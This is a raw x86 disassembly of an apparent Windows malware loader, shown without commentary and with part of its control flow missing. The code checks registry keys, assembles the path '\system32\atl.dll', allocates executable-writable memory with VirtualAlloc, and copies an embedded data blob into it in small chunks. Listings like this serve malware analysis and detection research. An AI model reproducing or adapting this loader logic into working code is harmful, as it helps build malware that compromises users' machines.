0x00401010:	pushl	%ebp	; from: 0x0040153a(MAY)
0x00401011:	movl	%esp, %ebp
0x00401013:	subl	$0x8, %esp
0x00401016:	movl	0x8(%ebp), %eax
0x00401019:	movl	%eax, -4(%ebp)
0x0040101c:	movl	0xc(%ebp), %ecx
0x0040101f:	movl	%ecx, -8(%ebp)
0x00401022:	movl	-4(%ebp), %edx
0x00401025:	cmpl	-8(%ebp), %edx
0x00401028:	jae	0x00401031	; targets: 0x0040102a(MAY)
0x0040102a:	movl	-4(%ebp), %eax	; from: 0x00401028(MAY)
0x0040102d:	jmp	0x00401034	; targets: 0x00401034(MAY)
0x00401034:	movl	%ebp, %esp	; from: 0x0040102d(MAY)
0x00401036:	popl	%ebp
0x00401037:	ret	; targets: 0x0040153f(MAY)

0x00401040:	pushl	%ebp	; from: 0x00401506(MAY)
0x00401041:	movl	%esp, %ebp
0x00401043:	popl	%ebp
0x00401044:	ret	; targets: 0x0040150b(MAY)

0x00401050:	pushl	%ebp	; from: 0x0040142d(MAY)
0x00401051:	movl	%esp, %ebp
0x00401053:	movl	0x00403014, %eax
0x00401058:	movb	$0x73, 0x3(%eax)
0x0040105c:	movl	0x00403014, %ecx
0x00401062:	movb	$0x74, 0x4(%ecx)
0x00401066:	movl	0x00403014, %edx
0x0040106c:	movb	$0x65, 0x5(%edx)
0x00401070:	movl	0x00403014, %eax
0x00401075:	movb	$0x6d, 0x6(%eax)
0x00401079:	movl	0x00403014, %ecx
0x0040107f:	movb	$0x33, 0x7(%ecx)
0x00401083:	movl	0x00403014, %edx
0x00401089:	movb	$0x32, 0x8(%edx)
0x0040108d:	movl	0x00403014, %eax
0x00401092:	movb	$0x5c, 0x9(%eax)
0x00401096:	movl	0x00403014, %ecx
0x0040109c:	movb	$0x61, 0xa(%ecx)
0x004010a0:	movl	0x00403014, %edx
0x004010a6:	movb	$0x74, 0xb(%edx)
0x004010aa:	movl	0x00403014, %eax
0x004010af:	movb	$0x6c, 0xc(%eax)
0x004010b3:	movl	0x00403014, %ecx
0x004010b9:	movb	$0x2e, 0xd(%ecx)
0x004010bd:	movl	0x00403014, %edx
0x004010c3:	movb	$0x64, 0xe(%edx)
0x004010c7:	movl	0x00403014, %eax
0x004010cc:	movb	$0x6c, 0xf(%eax)
0x004010d0:	movl	0x00403014, %ecx
0x004010d6:	movb	$0x6c, 0x10(%ecx)
0x004010da:	movl	0x00403014, %edx
0x004010e0:	movb	$0x5c, (%edx)
0x004010e3:	movl	0x00403014, %eax
0x004010e8:	movb	$0x73, 0x1(%eax)
0x004010ec:	movl	0x00403014, %ecx
0x004010f2:	movb	$0x79, 0x2(%ecx)
0x004010f6:	popl	%ebp
0x004010f7:	ret	; targets: 0x00401432(MAY)

0x004011c0:	pushl	%ebp	; from: 0x00401439(MAY)
0x004011c1:	movl	%esp, %ebp
0x004011c3:	movl	0x8(%ebp), %eax
0x004011c6:	movl	-4(%eax), %eax
0x004011c9:	popl	%ebp
0x004011ca:	ret	; targets: 0x0040143e(MAY)

0x004011d0:	pushl	%ebp	; from: 0x004014e8(MAY)
0x004011d1:	movl	%esp, %ebp
0x004011d3:	subl	$0x8, %esp
0x004011d6:	movl	$0x19c, -4(%ebp)
0x004011dd:	movl	VirtualAlloc@kernel32.dll, %eax
0x004011e2:	movl	%eax, -8(%ebp)
0x004011e5:	pushl	$0x40
0x004011e7:	pushl	$0x3000
0x004011ec:	movl	0x8(%ebp), %ecx
0x004011ef:	pushl	%ecx
0x004011f0:	pushl	$0x0
0x004011f2:	call	-8(%ebp)	; targets: 0xff000f20(MAY)
0x004011f5:	movl	%ebp, %esp
0x004011f7:	popl	%ebp
0x004011f8:	ret	; targets: 0x004014ed(MAY)

0x00401290:	pushl	%ebp	; from: 0x00401569(MAY)
0x00401291:	movl	%esp, %ebp
0x00401293:	subl	$0xc, %esp
0x00401296:	movl	$0x68e9, -4(%ebp)
0x0040129d:	movl	$0x86, -4(%ebp)
0x004012a4:	movl	$0x0, -12(%ebp)
0x004012ab:	jmp	0x004012b6	; targets: 0x004012b6(MAY)
0x004012ad:	movl	-12(%ebp), %eax	; from: 0x004012ea(MAY)
0x004012b0:	addl	$0x1, %eax
0x004012b3:	movl	%eax, -12(%ebp)
0x004012b6:	movl	-12(%ebp), %ecx	; from: 0x004012ab(MAY)
0x004012b9:	cmpl	0x10(%ebp), %ecx
0x004012bc:	jnl	0x004012ec	; targets: 0x004012ec(MAY), 0x004012be(MAY)
0x004012be:	movl	$0x86, -4(%ebp)	; from: 0x004012bc(MAY)
0x004012c5:	movl	0xc(%ebp), %edx
0x004012c8:	addl	-12(%ebp), %edx
0x004012cb:	movzbl	(%edx), %eax
0x004012ce:	movl	%eax, -8(%ebp)
0x004012d1:	movl	$0x86, -4(%ebp)
0x004012d8:	movl	0x8(%ebp), %ecx
0x004012db:	addl	-12(%ebp), %ecx
0x004012de:	movb	-8(%ebp), %dl
0x004012e1:	movb	%dl, (%ecx)
0x004012e3:	movl	$0x86, -4(%ebp)
0x004012ea:	jmp	0x004012ad	; targets: 0x004012ad(MAY)
0x004012ec:	movl	%ebp, %esp	; from: 0x004012bc(MAY)
0x004012ee:	popl	%ebp
0x004012ef:	ret	; targets: unresolved


start:
0x004012f0:	pushl	%ebp
0x004012f1:	movl	%esp, %ebp
0x004012f3:	subl	$0x174, %esp
0x004012f9:	pusha	
0x004012fa:	movl	%ebp, 0x00406108
0x00401300:	movl	$0x0, -328(%ebp)
0x0040130a:	leal	-296(%ebp), %eax
0x00401310:	pushl	%eax
0x00401311:	pushl	$0x20019
0x00401316:	pushl	$0x0
0x00401318:	pushl	$0x40306c
0x0040131d:	pushl	$0x80000002
0x00401322:	call	RegOpenKeyExW@advapi32.dll	; targets: 0xff0008a0(MAY)
0x00401328:	testl	%eax, %eax
0x0040132a:	je	0x0040133b	; targets: 0x0040133b(MAY), 0x0040132c(MAY)
0x0040132c:	pushl	$0x4	; from: 0x0040132a(MAY)
0x0040132e:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000ef0(MAY)
0x00401334:	xorl	%eax, %eax
0x00401336:	jmp	0x0040177c	; targets: 0x0040177c(MAY)
0x0040133b:	leal	-296(%ebp), %ecx	; from: 0x0040132a(MAY)
0x00401341:	pushl	%ecx
0x00401342:	pushl	$0x20019
0x00401347:	pushl	$0x0
0x00401349:	pushl	$0x403080
0x0040134e:	movl	-296(%ebp), %edx
0x00401354:	pushl	%edx
0x00401355:	call	RegOpenKeyExW@advapi32.dll	; targets: 0xff0008a0(MAY)
0x0040135b:	testl	%eax, %eax
0x0040135d:	je	0x0040136e	; targets: 0x0040136e(MAY), 0x0040135f(MAY)
0x0040135f:	pushl	$0x4	; from: 0x0040135d(MAY)
0x00401361:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000ef0(MAY)
0x00401367:	xorl	%eax, %eax
0x00401369:	jmp	0x0040177c	; targets: 0x0040177c(MAY)
0x0040136e:	leal	-296(%ebp), %eax	; from: 0x0040135d(MAY)
0x00401374:	pushl	%eax
0x00401375:	pushl	$0x20019
0x0040137a:	pushl	$0x0
0x0040137c:	pushl	$0x403090
0x00401381:	movl	-296(%ebp), %ecx
0x00401387:	pushl	%ecx
0x00401388:	call	RegOpenKeyExW@advapi32.dll	; targets: 0xff0008a0(MAY)
0x0040138e:	testl	%eax, %eax
0x00401390:	je	0x004013a1	; targets: 0x004013a1(MAY), 0x00401392(MAY)
0x00401392:	pushl	$0x4	; from: 0x00401390(MAY)
0x00401394:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000ef0(MAY)
0x0040139a:	xorl	%eax, %eax
0x0040139c:	jmp	0x0040177c	; targets: 0x0040177c(MAY)
0x004013a1:	movl	CreateFileA@kernel32.dll, %edx	; from: 0x00401390(MAY)
0x004013a7:	movl	%edx, -348(%ebp)
0x004013ad:	movl	$0x409004, -312(%ebp)
0x004013b7:	movl	$0x0, -276(%ebp)
0x004013c1:	movl	$0x64, -320(%ebp)
0x004013cb:	movl	$0x1, -284(%ebp)
0x004013d5:	movl	$0x0, -328(%ebp)
0x004013df:	movl	$0x0, -292(%ebp)
0x004013e9:	movl	$0x1, -316(%ebp)
0x004013f3:	movl	$0x0, -328(%ebp)
0x004013fd:	movl	$0x0, -292(%ebp)
0x00401407:	movl	$0x1, -316(%ebp)
0x00401411:	movl	$0x3, -280(%ebp)
0x0040141b:	pushl	$0x104
0x00401420:	leal	-272(%ebp), %eax
0x00401426:	pushl	%eax
0x00401427:	call	GetWindowsDirectoryA@kernel32.dll	; targets: 0xff000f50(MAY)
0x0040142d:	call	0x00401050	; targets: 0x00401050(MAY)
0x00401432:	movl	-312(%ebp), %ecx	; from: 0x004010f7(MAY)
0x00401438:	pushl	%ecx
0x00401439:	call	0x004011c0	; targets: 0x004011c0(MAY)
0x0040143e:	addl	$0x4, %esp	; from: 0x004011ca(MAY)
0x00401441:	movl	%eax, -332(%ebp)
0x00401447:	leal	-296(%ebp), %edx
0x0040144d:	pushl	%edx
0x0040144e:	pushl	$0x20019
0x00401453:	pushl	$0x0
0x00401455:	pushl	$0x4030b0
0x0040145a:	movl	-296(%ebp), %eax
0x00401460:	pushl	%eax
0x00401461:	call	RegOpenKeyExW@advapi32.dll	; targets: 0xff0008a0(MAY)
0x00401467:	testl	%eax, %eax
0x00401469:	je	0x0040147a	; targets: 0x0040146b(MAY), 0x0040147a(MAY)
0x0040146b:	pushl	$0x4	; from: 0x00401469(MAY)
0x0040146d:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000ef0(MAY)
0x00401473:	xorl	%eax, %eax
0x00401475:	jmp	0x0040177c	; targets: 0x0040177c(MAY)
0x0040147a:	movl	0x00403014, %ecx	; from: 0x00401469(MAY)
0x00401480:	pushl	%ecx
0x00401481:	leal	-272(%ebp), %edx
0x00401487:	pushl	%edx
0x00401488:	call	lstrlenA@kernel32.dll	; targets: 0xff000670(MAY)
0x0040148e:	leal	-272(%ebp,%eax), %eax
0x00401495:	pushl	%eax
0x00401496:	call	lstrcpyA@kernel32.dll	; targets: 0xff0006a0(MAY)
0x0040149c:	pushl	$0x0
0x0040149e:	pushl	$0x80
0x004014a3:	pushl	$0x3
0x004014a5:	pushl	$0x0
0x004014a7:	movl	-280(%ebp), %ecx
0x004014ad:	pushl	%ecx
0x004014ae:	movl	-316(%ebp), %edx
0x004014b4:	pushl	%edx
0x004014b5:	leal	-272(%ebp), %eax
0x004014bb:	pushl	%eax
0x004014bc:	call	-348(%ebp)	; targets: 0xff000f80(MAY)
0x004014c2:	movl	%eax, -300(%ebp)
0x004014c8:	cmpl	$0xffffffff, -300(%ebp)
0x004014cf:	je	0x004014da	; targets: 0x004014da(MAY), 0x004014d1(MAY)
0x004014d1:	cmpl	$0x0, -300(%ebp)	; from: 0x004014cf(MAY)
0x004014d8:	jne	0x004014e1	; targets: 0x004014da(MAY), 0x004014e1(MAY)
0x004014da:	xorl	%eax, %eax	; from: 0x004014cf(MAY), 0x004014d8(MAY)
0x004014dc:	jmp	0x0040177c	; targets: 0x0040177c(MAY)
0x004014e1:	movl	-332(%ebp), %ecx	; from: 0x004014d8(MAY)
0x004014e7:	pushl	%ecx
0x004014e8:	call	0x004011d0	; targets: 0x004011d0(MAY)
0x004014ed:	addl	$0x4, %esp	; from: 0x004011f8(MAY)
0x004014f0:	movl	%eax, -324(%ebp)
0x004014f6:	movl	-332(%ebp), %edx
0x004014fc:	pushl	%edx
0x004014fd:	pushl	$0x0
0x004014ff:	movl	-324(%ebp), %eax
0x00401505:	pushl	%eax
0x00401506:	call	0x00401040	; targets: 0x00401040(MAY)
0x0040150b:	addl	$0xc, %esp	; from: 0x00401044(MAY)
0x0040150e:	movl	-332(%ebp), %ecx
0x00401514:	movl	%ecx, -340(%ebp)
0x0040151a:	movl	-328(%ebp), %edx
0x00401520:	cmpl	-332(%ebp), %edx
0x00401526:	jae	0x004015b2	; targets: 0x0040152c(MAY)
0x0040152c:	movl	-340(%ebp), %eax	; from: 0x00401526(MAY)
0x00401532:	pushl	%eax
0x00401533:	movl	-320(%ebp), %ecx
0x00401539:	pushl	%ecx
0x0040153a:	call	0x00401010	; targets: 0x00401010(MAY)
0x0040153f:	addl	$0x8, %esp	; from: 0x00401037(MAY)
0x00401542:	movl	%eax, -344(%ebp)
0x00401548:	movl	-344(%ebp), %edx
0x0040154e:	pushl	%edx
0x0040154f:	movl	-312(%ebp), %eax
0x00401555:	addl	-292(%ebp), %eax
0x0040155b:	pushl	%eax
0x0040155c:	movl	-324(%ebp), %ecx
0x00401562:	addl	-328(%ebp), %ecx
0x00401568:	pushl	%ecx
0x00401569:	call	0x00401290	; targets: 0x00401290(MAY)
0x0040177c:	movl	%ebp, %esp	; from: 0x004014dc(MAY), 0x00401336(MAY), 0x00401475(MAY), 0x00401369(MAY), 0x0040139c(MAY)
0x0040177e:	popl	%ebp
0x0040177f:	ret	; targets: 0xfee70000(MAY)

